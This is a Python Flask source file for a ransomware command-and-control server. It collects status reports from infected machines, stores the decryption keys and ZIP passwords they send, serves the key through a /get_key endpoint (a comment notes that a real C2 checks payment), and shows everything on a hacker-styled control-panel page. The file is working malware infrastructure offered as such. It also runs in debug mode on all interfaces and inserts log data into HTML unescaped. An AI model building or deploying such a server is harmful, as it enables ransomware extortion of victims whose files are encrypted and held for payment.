from flask import Flask, request, jsonify
import os

app = Flask(__name__)

status_log = []
DECRYPTION_KEY = os.environ.get('DECRYPTION_KEY', '')
ZIP_PASSWORD = ''

@app.route('/status', methods=['POST'])
def status():
    global DECRYPTION_KEY, ZIP_PASSWORD
    data = request.json
    # If the status update includes a decryption key or zip password, update the globals
    if isinstance(data, dict) and 'data' in data and isinstance(data['data'], dict):
        if 'decryption_key' in data['data']:
            DECRYPTION_KEY = data['data']['decryption_key']
            print(f"[C2] Decryption key updated: {DECRYPTION_KEY}")
        if 'zip_password' in data['data']:
            ZIP_PASSWORD = data['data']['zip_password']
            print(f"[C2] ZIP password updated: {ZIP_PASSWORD}")
    status_log.append(data)
    print(f"[C2] Status update: {data}")
    return jsonify({'result': 'ok'}), 200

@app.route('/get_key', methods=['GET'])
def get_key():
    # In real C2, you would authenticate and check payment, etc.
    return jsonify({'decryption_key': DECRYPTION_KEY}), 200

@app.route('/log', methods=['GET'])
def get_log():
    return jsonify({'log': status_log})

@app.route('/')
def index():
    import json as pyjson
    # Prepare log table rows in a hacker/terminal style
    log_rows = ""
    for entry in reversed(status_log):
        status = entry.get('status', '-') if isinstance(entry, dict) else '-'
        data = entry.get('data', '-') if isinstance(entry, dict) else '-'
        # Pretty-print the data as hacker-style key-value pairs
        if isinstance(data, dict):
            data_lines = []
            for k, v in data.items():
                data_lines.append(f"<span class='kvkey'>[+]</span> <span class='kvfield'>{k}</span> <span class='kvsep'>:</span> <span class='kvval'>{v}</span>")
            data_str = "<br>".join(data_lines)
        else:
            data_str = f"<span class='kvval'>{data}</span>"
        log_rows += f"<tr><td>{status}</td><td><pre class='logdata' style='background:transparent;border:none;'>{data_str}</pre></td></tr>"
    return f'''
<html>
<head>
    <title>root@c2:~# Terminal</title>
    <style>
        body {{ background: #0a0f0a; color: #00ff41; font-family: 'Fira Mono', 'Consolas', 'Menlo', monospace; margin: 0; }}
        .container {{ max-width: 900px; margin: 40px auto; background: #111; border-radius: 10px; box-shadow: 0 4px 20px #000a; padding: 32px; border: 2px solid #00ff41; }}
        .banner {{ color: #00ff41; font-size: 2em; font-weight: bold; letter-spacing: 2px; text-shadow: 0 0 8px #00ff41; margin-bottom: 12px; }}
        .access {{ color: #00ff41; background: #111; padding: 6px 18px; border-radius: 6px; font-weight: bold; box-shadow: 0 0 10px #00ff4144; display: inline-block; margin-bottom: 16px; }}
        .keybox {{ background: #181c20; color: #00ff41; padding: 12px 16px; border-radius: 6px; font-size: 1.1em; display: inline-block; margin-right: 10px; word-break: break-all; border: 1px solid #00ff41; box-shadow: 0 0 8px #00ff4133; }}
        .copy-btn {{ background: #00ff41; color: #181c20; border: none; border-radius: 6px; padding: 8px 16px; cursor: pointer; font-weight: bold; box-shadow: 0 0 6px #00ff4177; }}
        .copy-btn:hover {{ background: #0f0; }}
        table {{ width: 100%; border-collapse: collapse; margin-top: 32px; }}
        th, td {{ border-bottom: 1px solid #00ff4133; padding: 10px; text-align: left; font-size: 1em; }}
        th {{ background: #181c20; color: #00ff41; border-bottom: 2px solid #00ff41; }}
        tr:hover td {{ background: #1a221a; }}
        .links a {{ color: #00ff41; text-decoration: none; margin-right: 16px; font-weight: bold; }}
        .links a:hover {{ text-decoration: underline; color: #fff; }}
        .logdata {{ background: #111; border-radius: 4px; padding: 6px; font-size: 1em; margin: 0; box-shadow: 0 0 8px #00ff4122; color: #fff; border: none; }}
        .kvkey {{ color: #00ff41; font-weight: bold; }}
        .kvfield {{ color: #00ff41; }}
        .kvsep {{ color: #fff; }}
        .kvval {{ color: #fff; }}
        .prompt {{ color: #fff; margin-bottom: 18px; display: block; font-size: 1.1em; }}
        .glow {{ text-shadow: 0 0 8px #00ff41, 0 0 2px #00ff41; }}
        .blinker {{ animation: blink 1.2s steps(2, start) infinite; }}
        @keyframes blink {{ to {{ visibility: hidden; }} }}
    </style>
</head>
<body>
    <div class="container">
        <div class="banner glow">root@c2:~# C2 CONTROL PANEL</div>
        <div class="access">ACCESS GRANTED <span class="blinker">_</span></div>
        <span class="prompt">[+] Current Decryption Key:</span>
        <span class="keybox" id="keybox">{DECRYPTION_KEY}</span>
        <button class="copy-btn" onclick="copyKey()">Copy</button>
        <span class="prompt">[+] Current ZIP Password:</span>
        <span class="keybox" id="zippassbox">{ZIP_PASSWORD}</span>
        <button class="copy-btn" onclick="copyZipPass()">Copy</button>
        <div class="links" style="margin:18px 0 0 0;">
            <a href="/log" target="_blank">View Raw Log (JSON)</a>
            <a href="/get_key" target="_blank">Get Key (JSON)</a>
        </div>
        <div style="margin-top:36px;">
            <span class="prompt">[+] Status Log:</span>
            <table>
                <tr><th>Status</th><th>Data</th></tr>
                {log_rows if log_rows else '<tr><td colspan=2>No log entries yet.</td></tr>'}
            </table>
        </div>
    </div>
    <script>
        function copyKey() {{
            var key = document.getElementById('keybox').innerText;
            navigator.clipboard.writeText(key);
            var btn = document.querySelectorAll('.copy-btn')[0];
            btn.innerText = 'Copied!';
            setTimeout(function() {{ btn.innerText = 'Copy'; }}, 1000);
        }}
        function copyZipPass() {{
            var pass = document.getElementById('zippassbox').innerText;
            navigator.clipboard.writeText(pass);
            var btn = document.querySelectorAll('.copy-btn')[1];
            btn.innerText = 'Copied!';
            setTimeout(function() {{ btn.innerText = 'Copy'; }}, 1000);
        }}
    </script>
</body>
</html>
'''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
